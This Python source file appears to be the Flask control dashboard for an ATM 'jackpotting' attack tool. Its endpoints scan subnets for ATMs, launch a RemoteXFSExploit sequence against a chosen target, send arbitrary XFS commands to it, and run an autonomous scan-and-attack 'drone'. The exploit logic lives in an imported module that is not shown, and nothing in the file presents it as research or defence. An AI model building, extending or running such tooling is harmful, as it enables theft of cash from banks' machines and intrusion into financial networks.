#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
web_interface.py - Flask web dashboard for remote jackpot drone control
"""

import json
import threading
import os
from flask import Flask, render_template, request, jsonify, send_from_directory
from network_xfs import NetworkJackpotDrone, RemoteXFSExploit

# ============================================================================
# Flask App Setup
# ============================================================================

app = Flask(__name__, template_folder='templates')

# ============================================================================
# Global State
# ============================================================================

drone = NetworkJackpotDrone()
exploit = RemoteXFSExploit()

drone_status = {
    'scanning': False,
    'targets': [],
    'last_results': [],
    'timestamp': None
}

# ============================================================================
# Routes
# ============================================================================

@app.route('/')
def index():
    """Main dashboard"""
    return render_template('dashboard.html', status=drone_status)

@app.route('/api/status')
def api_status():
    """Get current status"""
    return jsonify({
        'scanning': drone.scanning,
        'targets': len(drone.targets),
        'results': len(drone.results),
        'targets_list': [t.get('ip', str(t)) for t in drone.targets[:10]],
        'last_result': drone.results[-1] if drone.results else None
    })

@app.route('/api/scan', methods=['POST'])
def api_scan():
    """Start a network scan"""
    data = request.json or {}
    subnet = data.get('subnet', '192.168.1.0/24')
    
    def scan_thread():
        atms = exploit.scan_subnet(subnet)
        drone.targets.extend(atms)
        drone_status['targets'] = drone.targets
    
    thread = threading.Thread(target=scan_thread)
    thread.start()
    
    return jsonify({'status': 'scanning', 'subnet': subnet})

@app.route('/api/exploit', methods=['POST'])
def api_exploit():
    """Execute exploit on target"""
    data = request.json or {}
    target_ip = data.get('target')
    port = int(data.get('port', 7777))
    
    if not target_ip:
        return jsonify({'error': 'target required'}), 400
    
    result = exploit.exploit_sequence(target_ip, port)
    drone.results.append(result)
    drone_status['last_results'] = drone.results[-5:]
    
    return jsonify(result)

@app.route('/api/command', methods=['POST'])
def api_command():
    """Execute custom XFS command"""
    data = request.json or {}
    target_ip = data.get('target')
    port = int(data.get('port', 7777))
    command = data.get('command')
    
    if not target_ip or not command:
        return jsonify({'error': 'target and command required'}), 400
    
    result = exploit.execute_remote_command(target_ip, port, command)
    return jsonify({'command': command, 'result': result})

@app.route('/api/start_drone', methods=['POST'])
def api_start_drone():
    """Start autonomous drone"""
    data = request.json or {}
    subnet = data.get('subnet', '192.168.1.0/24')
    interval = int(data.get('interval', 60))
    
    if not drone.scanning:
        def drone_thread():
            drone.start_autonomous_scan(subnet, interval)
        
        thread = threading.Thread(target=drone_thread)
        thread.start()
        drone_status['scanning'] = True
        
        return jsonify({'status': 'started', 'subnet': subnet, 'interval': interval})
    
    return jsonify({'status': 'already running'})

@app.route('/api/stop_drone', methods=['POST'])
def api_stop_drone():
    """Stop autonomous drone"""
    drone.stop()
    drone_status['scanning'] = False
    return jsonify({'status': 'stopped'})

@app.route('/api/clear_results', methods=['POST'])
def api_clear_results():
    """Clear results"""
    drone.results = []
    drone_status['last_results'] = []
    return jsonify({'status': 'cleared'})

# ============================================================================
# Main
# ============================================================================

def run_web_server(host: str = '0.0.0.0', port: int = 8080, debug: bool = False):
    """Start web server"""
    print(f"🌐 Web interface starting on http://{host}:{port}")
    print(f"📡 Access from any browser on the network")
    app.run(host=host, port=port, debug=debug, threaded=True)

if __name__ == '__main__':
    run_web_server()
